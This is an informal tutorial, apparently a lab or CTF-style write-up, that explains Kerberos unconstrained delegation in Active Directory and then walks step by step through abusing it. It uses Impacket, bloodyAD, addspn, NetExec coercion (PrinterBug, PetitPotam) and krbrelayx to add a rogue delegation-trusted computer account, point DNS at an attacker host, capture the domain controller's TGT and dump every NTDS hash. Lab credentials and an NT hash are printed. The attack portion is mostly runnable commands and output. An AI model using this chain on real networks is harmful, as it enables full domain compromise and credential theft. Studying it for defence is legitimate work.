---
icon: hexagon-xmark
---

# Unconstrained Delegation

## Kerberos Unconstrained Delegation

Okay so if you've ever gone down the AD rabbit hole you've probably run into this term "delegation" and just kinda nodded along pretending you get it. Same here fr. Took me a minute to actually wrap my head around it so figured I'd write it out the way I wish someone explained it to me first, no fluff.

### The Principle of Delegation (aka why this even exists)

Imagine you've got a web app. Nice clean interface, you log in, you click a button, and it shows you your personal folder that's actually sitting on a totally different machine, a file server somewhere else on the network.

So the actual flow looks like this:

<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

The web server is the one doing all the legwork. It goes and grabs your files from the file server and shows them to you in that pretty UI.

But here's the thing. The web server has zero clue what actually belongs to you on that file server. It's not its job to crack open your Kerberos PAC (basically the data blob that holds your permissions and group memberships) and manually figure out what you're allowed to touch. That's just not what it's built to do, and honestly it shouldn't have to.

This is exactly the problem delegation was built to solve. Delegation lets the web server basically "become you" for a moment and authenticate to the file server as if it's actually you making the request. So from the file server's point of view, it looks like you showed up in person. It does its normal permission checks like it always would, and only sends back what your account is actually allowed to see. Then the web server just displays that in its nice little interface.

That's it. That's the whole principle. One service borrowing your identity so it can talk to another service on your behalf without you having to do anything extra.

<figure><img src="../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

### Unconstrained Delegation

So there's actually three flavors of delegation in AD (Unconstrained, Constrained, and Resource Based Constrained), but we're diving into the OG one here, Unconstrained Delegation, cause it's the wildest one and honestly the easiest to understand once it clicks.

Here's the deal. This power (the ability to relay someone's identity) can only be handed to a machine account or a service account, basically anything that has at least one SPN attached to it. Normal user accounts don't get this by default cause they're not "services," they're just end users.

In Unconstrained Delegation specifically, if a machine or service account gets this right, it can impersonate literally any user for literally any service on any machine in the domain. No restrictions, no list, nothing. That's the "unconstrained" part, there's no fence around what it can do.

#### How it actually works under the hood

Two things gotta be true for this to fire:

1. The machine or service account needs the `TRUSTED_FOR_DELEGATION` flag set in its UAC attributes. Setting this flag requires `SeEnableDelegationPrivilege`, which is normally locked down to Domain Admins only.
2. The user being impersonated must NOT have the `NOT_DELEGATED` flag set on their account. By default literally nobody has this flag, so by default everyone is technically "relayable."

<figure><img src="../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

#### Step 1: Find or create your target

First move is figuring out if any account in the domain already has Unconstrained Delegation enabled. You can check with a tool like Impacket's `findDelegation.py`:

```
findDelegation.py delegate.vl/N.Thompson:KALEB_2341 -dc-ip 10.129.234.69

AccountName  AccountType  DelegationType  DelegationRightsTo  SPN Exists
-----------  -----------  --------------  ------------------  ----------
DC1$         Computer     Unconstrained   N/A                 Yes
```

So in a lot of real environments you'll actually stumble on an existing legacy box (old print servers love this misconfig) that already has this flag lit up. If that's the case you skip straight to compromising that machine and jump to Step 5 below, no need to build anything.

But sometimes you gotta build your own path. If your compromised user happens to have `SeEnableDelegationPrivilege` (rare, but happens in misconfigured environments), here's how you'd build a fake unconstrained delegation setup.

#### Step 2: Create your own computer account

By default every domain user can create up to 10 computer accounts, this is a built in AD behavior called Machine Account Quota. Using a tool bloodyAD:

```
bloodyAD --host DC1.delegate.vl -d delegate.vl -u N.Thompson -p KALEB_2341 add computer attack Password123@
[+] attack$ created
```

#### Step 3: Slap the delegation flag on it

If your user has that special privilege we mentioned, you can set the flag directly:

```
bloodyAD --host DC1.delegate.vl -d delegate.vl -u N.Thompson -p KALEB_2341 add uac attack$ -f TRUSTED_FOR_DELEGATION
```

Your fresh fake account is now unconstrained delegation trusted. Congrats, it's basically a baby domain controller magnet now lol.

#### Step 4: Point DNS at yourself

Since this account isn't a real machine on the network, you gotta manually tell DNS where it lives, pointed straight at your attack box:

```
bloodyAD --host DC1.delegate.vl -d delegate.vl -u N.Thompson -p KALEB_2341 add dnsRecord attack 10.10.14.94
```

> Quick note here, if you're using an actual existing machine that's already unconstrained delegation trusted, you can skip this whole DNS step entirely. Real machines already have proper DNS records pointing to their real IPs. This step only matters when you're spinning up a fake account from nothing.

#### Step 5: Give it a proper SPN

```
python addspn.py -u 'DELEGATE.VL\N.Thompson' -p 'KALEB_2341' -s 'CIFS/attack.DELEGATE.VL' 'DC1.delegate.vl' -t attack$
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

#### Step 6: Check what coercion methods work

Before forcing anything, check what the target is vulnerable to:

```
nxc smb DC1.delegate.vl -u N.Thompson -p KALEB_2341 -M coerce_plus
```

You'll typically see something like:

```
COERCE_PLUS   VULNERABLE, DFSCoerce
COERCE_PLUS   VULNERABLE, PetitPotam
COERCE_PLUS   VULNERABLE, PrinterBug
```

#### Step 7: Trigger the coercion

Now the actual part, forcing the DC to authenticate back to your fake service:

```
nxc smb DC1.delegate.vl -u attack$ -p Password123@ -M coerce_plus -o METHOD=Printerbug LISTENER=attack.delegate.vl
```

#### Step 8: Catch the ticket

While that coercion fires off, you've got krbrelayx sitting there listening:

```
krbrelayx -s 'DELEGATE.VL\attack$' -hashes ':CC8147F790C91200A3E02C2EBC65F9FB'
```

If everything lines up you'll see something beautiful pop up in your terminal:

```
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

That's the DC's own machine account TGT, just chilling in a file on your box now.

#### Step 9: Use the ticket, get everything

```
export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
nxc smb DC1.delegate.vl -k --use-kcache --ntds
```

Since DC computer accounts have replication rights by default, this is basically a straight shot to a full DCSync. You walk away with every hash in the domain including krbtgt, which at that point means the whole forest is yours.

### Wrapping This Up

Honestly writing this out made me realize how dumb simple the whole thing is once it clicks. Like it sounds scary when people throw around "TGT theft" and "domain compromise" but at the end of the day it's just one flag being set wrong, one coerced login, and a ticket sitting in memory waiting to be scooped up. That's it. That's the whole attack.
